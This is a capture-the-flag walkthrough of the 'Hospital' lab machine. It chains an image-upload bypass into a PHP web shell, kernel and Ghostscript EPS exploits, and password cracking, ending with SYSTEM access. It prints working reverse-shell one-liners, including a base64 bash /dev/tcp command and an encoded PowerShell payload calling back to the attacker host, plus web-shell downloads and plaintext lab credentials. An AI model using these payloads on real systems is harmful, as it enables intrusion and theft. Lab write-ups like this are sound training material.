# Hospital

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo nmap -sV -sC -T4 10.10.11.241 -p-   
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-09 13:16 EST
Nmap scan report for dc.hospital.htb (10.10.11.241)
Host is up (0.041s latency).
Not shown: 65506 filtered tcp ports (no-response)
PORT     STATE SERVICE           VERSION
22/tcp   open  ssh               OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e1:4b:4b:3a:6d:18:66:69:39:f7:aa:74:b3:16:0a:aa (ECDSA)
|_  256 96:c1:dc:d8:97:20:95:e7:01:5f:20:a2:43:61:cb:ca (ED25519)
53/tcp   open  domain            Simple DNS Plus
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2025-12-10 01:18:18Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
443/tcp  open  ssl/http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_http-title: Hospital Webmail :: Welcome to Hospital Webmail
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
1801/tcp open  msmq?
2103/tcp open  msrpc             Microsoft Windows RPC
2105/tcp open  msrpc             Microsoft Windows RPC
2107/tcp open  msrpc             Microsoft Windows RPC
2179/tcp open  vmrdp?
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
3269/tcp open  globalcatLDAPssl?
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
3389/tcp open  ms-wbt-server     Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: HOSPITAL
|   NetBIOS_Domain_Name: HOSPITAL
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: hospital.htb
|   DNS_Computer_Name: DC.hospital.htb
|   DNS_Tree_Name: hospital.htb
|   Product_Version: 10.0.17763
|_  System_Time: 2025-12-10T01:19:09+00:00
| ssl-cert: Subject: commonName=DC.hospital.htb
| Not valid before: 2025-12-08T23:52:19
|_Not valid after:  2026-06-09T23:52:19
5985/tcp open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
6404/tcp open  msrpc             Microsoft Windows RPC
6406/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
6407/tcp open  msrpc             Microsoft Windows RPC
6409/tcp open  msrpc             Microsoft Windows RPC
6613/tcp open  msrpc             Microsoft Windows RPC
6633/tcp open  msrpc             Microsoft Windows RPC
6927/tcp open  msrpc             Microsoft Windows RPC
8080/tcp open  http              Apache httpd 2.4.55 ((Ubuntu))
| http-title: Login
|_Requested resource was login.php
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.55 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
9389/tcp open  mc-nmf            .NET Message Framing
Service Info: Host: DC; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows
```

On port 443 we have a roundcube server. We can't login as we don't have any credentials

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FzmluhNZyI7Uae94IUVOc%2Fimage.png?alt=media&#x26;token=622a291f-e0c0-4762-830a-8db8adc862a5" alt=""><figcaption></figcaption></figure>

On port 8080 we find another application. We can register an account

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FeWAefXfOBf9ZLrDbsrcW%2Fimage.png?alt=media&#x26;token=cf59f2ef-061b-4574-bd01-f800ca51901a" alt=""><figcaption></figcaption></figure>

Then we have the ability to upload images files

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FM0d0De66oHGrl0CJLbKL%2Fimage.png?alt=media&#x26;token=084fe1b8-b2d6-4f55-9969-e020231d6175" alt=""><figcaption></figcaption></figure>

Next we need to find where the files are uploaded. We fuzz for directories

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ dirsearch -u http://hospital.htb:8080

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                                                                                                            
 (_||| _) (/_(_|| (_| )                                                                                                                                                                                                                     
                                                                                                                                                                                                                                            
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/Downloads/reports/http_hospital.htb_8080/_25-12-09_13-29-52.txt

Target: http://hospital.htb:8080/

[13:29:52] Starting:                                                                                                                                                                                                                        
[13:29:53] 301 -  316B  - /js  ->  http://hospital.htb:8080/js/             
[13:29:56] 403 -  279B  - /.ht_wsr.txt                                      
[13:29:56] 403 -  279B  - /.htaccess.bak1                                   
[13:29:56] 403 -  279B  - /.htaccess.orig                                   
[13:29:56] 403 -  279B  - /.htaccess.sample                                 
[13:29:56] 403 -  279B  - /.htaccess.save
[13:29:56] 403 -  279B  - /.htaccess_extra                                  
[13:29:56] 403 -  279B  - /.htaccessOLD
[13:29:56] 403 -  279B  - /.htaccessBAK                                     
[13:29:56] 403 -  279B  - /.htaccess_orig
[13:29:56] 403 -  279B  - /.htaccess_sc
[13:29:56] 403 -  279B  - /.htaccessOLD2                                    
[13:29:56] 403 -  279B  - /.html                                            
[13:29:56] 403 -  279B  - /.htm
[13:29:56] 403 -  279B  - /.htpasswd_test                                   
[13:29:56] 403 -  279B  - /.htpasswds
[13:29:56] 403 -  279B  - /.httr-oauth                                      
[13:29:57] 403 -  279B  - /.php                                             
[13:30:13] 200 -    0B  - /config.php                                       
[13:30:14] 301 -  317B  - /css  ->  http://hospital.htb:8080/css/           
[13:30:18] 301 -  319B  - /fonts  ->  http://hospital.htb:8080/fonts/       
[13:30:20] 403 -  279B  - /images/                                          
[13:30:20] 301 -  320B  - /images  ->  http://hospital.htb:8080/images/     
[13:30:22] 403 -  279B  - /js/                                              
[13:30:23] 200 -    2KB - /login.php                                        
[13:30:32] 200 -    2KB - /register.php                                     
[13:30:33] 403 -  279B  - /server-status/                                   
[13:30:33] 403 -  279B  - /server-status                                    
[13:30:39] 200 -    0B  - /upload.php                                       
[13:30:39] 301 -  321B  - /uploads  ->  http://hospital.htb:8080/uploads/   
[13:30:39] 403 -  279B  - /uploads/                                         
[13:30:40] 403 -  279B  - /vendor/
```

We find `/uploads` which is probably interesting. Directory listing is forbidden

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FiVWxCmsqn4xe0YuTMDQq%2Fimage.png?alt=media&#x26;token=3ccb5991-80be-4c54-b079-2d8a87218661" alt=""><figcaption></figcaption></figure>

But if we search for our file we can still access it

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FTxYZ2lofr7m4lSjsRzIc%2Fimage.png?alt=media&#x26;token=7ead103d-755b-437e-911f-413e43f11cd0" alt=""><figcaption></figcaption></figure>

We can now try to upload a malicious file. Changing the extension to php in burp leads to an error. We will try to fuzz for authorized extensions using the following wordlist and burp intruder

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FaBmI4zmxPSE2G7MDSOGW%2Fimage.png?alt=media&#x26;token=d7fc6fd7-9a2a-4ad7-b260-f2b21f8768d9" alt=""><figcaption></figcaption></figure>

For the `.phar` file, we get redirected to `/success.php` which means our upload was successful

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FK7yr9WMgPSknL9fdok2n%2Fimage.png?alt=media&#x26;token=72155e56-f910-4ac9-a5a9-43efcf5b197f" alt=""><figcaption></figcaption></figure>

We try browsing to the file to see if the code is executed. It is, so we can pass it a web shell

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FXpSUrhG0TZNdpErW5KcB%2Fimage.png?alt=media&#x26;token=0a908d46-1254-432c-a666-a0f0b4e50894" alt=""><figcaption></figcaption></figure>

Pass the web shell

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FpgVxynQCTM0MAhoh7q4M%2Fimage.png?alt=media&#x26;token=2da14097-c6fb-41f7-8927-0dc104978145" alt=""><figcaption></figcaption></figure>

We can't get any command output. I tried different functions but nothing

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FxlEegpNVAR8S3d9KZACR%2Fimage.png?alt=media&#x26;token=c6859589-f865-4dfe-9160-b8c299c13d1f" alt=""><figcaption></figcaption></figure>

Many functions may be disabled by default to prevent this kind of behavior. We can try to call phpinfo() as it contains the disabled functions. We see that most command execution functions are disabled

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FKEQuklDdMQbG9s24GHn4%2Fimage.png?alt=media&#x26;token=7882f3ac-c26e-4167-bd4a-d7ed61aeb0fb" alt=""><figcaption></figcaption></figure>

But there is still one we can use : `popen()`. We find a script that tests for many functions

We get command execution

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FZvKUFA3IEZZKUdXhWq2a%2Fimage.png?alt=media&#x26;token=a1dc74ba-c560-4df9-bfc6-7cf988688f21" alt=""><figcaption></figcaption></figure>

We also see that the web server is linux, but the box is windows

We get a reverse shell with the following command URL encoded

```shellscript
echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4yLzkwMDEgMD4mMQ==' | base64 -d | bash
```

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FrcLIaegKHhWKvAC4jcrk%2Fimage.png?alt=media&#x26;token=47b1191b-d845-4201-a333-fde61592cd90" alt=""><figcaption></figcaption></figure>

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ penelope -p 9001 
[+] Listening for reverse shells on 0.0.0.0:9001 →  127.0.0.1 • 192.168.198.134 • 172.17.0.1 • 172.18.0.1 • 172.19.0.1 • 10.10.16.2
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from webserver~10.10.11.241-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/sessions/webserver~10.10.11.241-Linux-x86_64/2025_12_09-15_07_59-312.log 📜
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
www-data@webserver:/var/www/html/uploads$ id 
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

We find credentials for the MySQL DB

```php
www-data@webserver:/var/www/html$ cat config.php
<?php
/* Database credentials. Assuming you are running MySQL
server with default setting (user 'root' with no password) */
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'root');
define('DB_PASSWORD', 'my$qls3rv1c3!');
define('DB_NAME', 'hospital');
 
/* Attempt to connect to MySQL database */
$link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);
 
// Check connection
if($link === false){
    die("ERROR: Could not connect. " . mysqli_connect_error());
}
?>
```

root:my$qls3rv1c3!

```shellscript
MariaDB [hospital]> select * from users;
+----+----------+--------------------------------------------------------------+---------------------+
| id | username | password                                                     | created_at          |
+----+----------+--------------------------------------------------------------+---------------------+
|  1 | admin    | $2y$10$caGIEbf9DBF7ddlByqCkrexkt0cPseJJ5FiVO1cnhG.3NLrxcjMh2 | 2023-09-21 14:46:04 |
|  2 | patient  | $2y$10$a.lNstD7JdiNYxEepKf1/OZ5EM5wngYrf.m5RxXCgSud7MVU6/tgO | 2023-09-21 15:35:11 |
|  3 | test     | $2y$10$XhddGIKuxmhMWjbg4EIZ2uo.mkO86xbs6DdnOIJLM4sWLRCIsa03u | 2025-12-10 01:18:38 |
+----+----------+--------------------------------------------------------------+---------------------+
```

We crack the hash : admin:123456

But it is useless in our case. We find that the system is vulnerable to a kernel exploit

```shellscript
www-data@webserver:/tmp$ uname -a
Linux webserver 5.19.0-35-generic
```

We compile the project, transfer the file to the target and run the exploit

```shellscript
www-data@webserver:/tmp$ ./exploit 
[+] Using config: 5.19.0-35-generic
[+] Recovering module base
[+] Module base: 0xffffffffc0512000
[+] Recovering kernel base
[+] Kernel base: 0xffffffffa9200000
[+] Got root !!!
# id
uid=0(root) gid=0(root) groups=0(root)
```

We can now get the hash for the user drwilliams in `/etc/shadow` and crack it

```shellscript
drwilliams:qwe123!@#
```

We test the credentials

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ nxc smb dc.hospital.htb -u drwilliams -p 'qwe123!@#'             
SMB         10.10.11.241    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:hospital.htb) (signing:True) (SMBv1:None)
SMB         10.10.11.241    445    DC               [+] hospital.htb\drwilliams:qwe123!@#
```

With those creds we can login in roundcube

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FJegXhXEhtbXTvarQDgkg%2Fimage.png?alt=media&#x26;token=8640a6e1-36d1-43cc-a146-4bbe51d1ecc2" alt=""><figcaption></figcaption></figure>

We see that he expects to receive an eps file. Looking online, we see a CVE associated with eps and Ghostscript

We use the exploit to craft a malicious eps file with an embedded reverse shell

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ python3 exp.py -g -p "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMgAiACwAOQAwADAAMQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=" -x eps --filename design
[+] Generated EPS payload file: design.eps
```

We send an email with the file attached and get a reverse shell as drbrown

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.16.2] from (UNKNOWN) [10.10.11.241] 12663

PS C:\Users\drbrown.HOSPITAL\Documents> whoami
hospital\drbrown
```

We know rouncube was running on apache. In the root of C:\\, we find the xampp directory, which holds the web server root in htdocs. <mark style="background-color:$danger;">It is always interesting to grab a shell as a web user, as he may have interesting privileges like SeImpersonatePrivilege.</mark>

We are able to write in the web folder. We place a web shell

```shellscript
PS C:\xampp\htdocs> iwr http://10.10.16.2:80/shell.php -o shell.php
PS C:\xampp\htdocs> ls 


    Directory: C:\xampp\htdocs


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----       10/22/2023  10:19 PM                bin                                                                   
d-----       10/22/2023  11:47 PM                config                                                                
d-----       10/22/2023  10:33 PM                default                                                               
d-----       10/22/2023  10:19 PM                installer                                                             
d-----       10/22/2023  10:32 PM                logs                                                                  
d-----       10/22/2023  10:19 PM                plugins                                                               
d-----       10/22/2023  10:20 PM                program                                                               
d-----       10/22/2023  10:20 PM                skins                                                                 
d-----       10/22/2023  10:19 PM                SQL                                                                   
d-----        12/9/2025   8:49 PM                temp                                                                  
d-----       10/22/2023  10:20 PM                vendor                                                                
-a----       10/16/2023  12:23 PM           2553 .htaccess                                                             
-a----       10/16/2023  12:23 PM         211743 CHANGELOG.md                                                          
-a----       10/16/2023  12:23 PM            994 composer.json                                                         
-a----       10/16/2023  12:23 PM           1086 composer.json-dist                                                    
-a----       10/16/2023  12:23 PM          56279 composer.lock                                                         
-a----       10/16/2023  12:23 PM          11199 index.php                                                             
-a----       10/16/2023  12:23 PM          12661 INSTALL                                                               
-a----       10/16/2023  12:23 PM          35147 LICENSE                                                               
-a----       10/16/2023  12:23 PM           3853 README.md                                                             
-a----       10/16/2023  12:23 PM            967 SECURITY.md                                                           
-a----        12/9/2025  10:53 PM             31 shell.php
```

We can now interact with the server. Here, it is running as SYSTEM

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FQuCp3nXM3cvMyo9zXYBy%2Fimage.png?alt=media&#x26;token=1e0b17c6-661f-4fec-bf3c-405aa1e03900" alt=""><figcaption></figcaption></figure>
